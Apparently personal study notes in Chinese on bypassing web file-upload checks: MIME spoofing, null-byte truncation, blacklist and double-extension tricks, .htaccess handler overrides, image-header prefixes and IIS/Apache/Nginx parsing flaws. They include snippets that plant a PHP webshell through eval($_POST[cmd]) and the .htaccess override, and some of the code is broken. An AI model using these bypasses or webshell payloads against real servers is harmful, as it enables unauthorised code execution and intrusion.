# load leaks
## javascript
移出当前检查后缀的 js 语句

### burp suite
更改扩展包，然后更改后缀

## 服务端 MIME 类型检查（检测 Content-Type 内容）
改扩展名，是绕不过去掉
在 post 请求中更改
Content-Type:image/gif（原为 Content-Type:text/plain)


## 服务端目录路径检测（检测跟 path 参数相关的内容）
关于 IIS
0x00 截断 漏洞
php 版本小于 2.6.4 都会这样
edjpgcom
将一句话木马插入到 jpg 中

## 服务端文件扩展名检测（检测跟文件 extension 相关的内容）

文件夹 cc.php / 里面所有的文件都会是以 php 运行

## 服务端文件内容检测（检测内容是否合法或者含有恶意代码）


## 黑名单检测
fckeditor 2.4.3

绕过方法：
- 文件名大小写绕过
	AsP，pHp
- 名单列表绕过
	利用黑名单没有的名单进行攻击  asa  cer
- 特殊文件名绕过
```
比如发送的 http 包吧文件名改为 test.asp. 或者 test.asp_ 在 windows 系统是不允许的 所以需要在 burp 之类进行修改，然后绕过验证之后，会被 windows 系统自带去掉后面的点和空格，但是 linux 和 Unix 没有这个特性
```

## 0x00 截断
name = getname(http reuqest)
假如获取的文件名是 test.asp .jpg(asp 后面为 0x00)

type = gettype(name)
gettype() 函数里处理方式是从后往前扫描扩展名，所以就判断为 jpg

if(type == jpg)
SaveFilePath(uploadpath.name, name)
但是这里却是以 0x00 作为文件名截断
最后以 test.asp 存入路径里

## 双扩展名解析绕开攻击
help.asp.123
Apache 从后面还是扫描  识别为 123 不会被 blacklist 截取
但是在 Apache 是从前向后扫描

## 双扩展名解析绕开攻击 2
如果 Apache 的 conf 里有一行配置 AddHandler-php5-script.php.jpg
即使扩展名是 jpg，一样以 php 执行

## .htaccess 文件攻击
上传一个自定义.htaccess

## 解析调用
配合上传一个代码注入过的非黑名单即可，在利用解析调用 / 漏洞


## 白名单

### 0x00 截断

### 解析调用 / 漏洞绕过
上传一个代码注入过的白名单文件即可，在利用解析调用

### .htaccess 文件攻击
Apache 安装之后就有一个这样的文件.htaccess
```
<FilesMatch "haha">
SetHandler application/x-httpd-php
</FilesMatch>
```
一句话木马文件名  haha  或者 haha1
这样会将 haha 以 php 解析

## 服务端检测绕过
### 文件幻数
jpg header:JFIF
gif header:GIF89a
png header:

### 文件相关信息监测
getimagesize()

GIF89a
(...some binary data for image)
<?php phpinfo(); ?>
(...some binary data for image)

### 文件加载检测
edjpgcom
在不破坏文件本身的渲染情况下找一个空白区进行填充一行木马
渲染 / 加载测试攻击
winhex 看数据可以分析工具原理

关于二次渲染  一般绕不过

### Apache leaks
属于白名单漏洞
x1.x2.x3
从后面开始解析，如果 x3 不认识，则检测 x2

Apacheserv 2.1.9 /2.5.10 /2.6.0
Apache 2.0.59 /2.2.8

### IIS 解析漏洞

1.asp;.jpg

依然可以菜刀连接

test.asp/1

依然作为 1.asp  运行
可以网上查询

### IIS 7.0 7.5 Nginx < 8.03
默认 Fast-CGI 开启状况下 test.jpg
<?php fput(fopen('shell.php', 'w'),'<php eval($_POST[cmd])?>');?>
然后访问 test.jpg/.php   这样会运行产生一个 shell.php


## 黑名单与白名单
### 黑名单
- 文件名大小写绕过
- 名单列表绕过
- 特殊文件名绕过
- 0x00 截断绕过
- .htaccess 文件攻击
- 本地包含漏洞
- Apache 解析漏洞
- IIS 解析漏洞
- Nginx 解析漏洞

### 白名单
- 0x00 截断绕过
- 本地文件包含漏洞
- IIS 解析漏洞
- Nginx 解析漏洞

## 上传攻击框架
用户输入
轻量级检测（检测绕过）javascript 检测 /MIME 类型检测绕过
文件内容检测（检测绕过） 代码注入过程
路径 / 扩展名检测
if 检测绕过
黑名单检测
白名单检测
else 检测未绕过
解析攻击
代码层解析调用 .htaccess 本地文件
应用层解析 Apache IIS Nginx

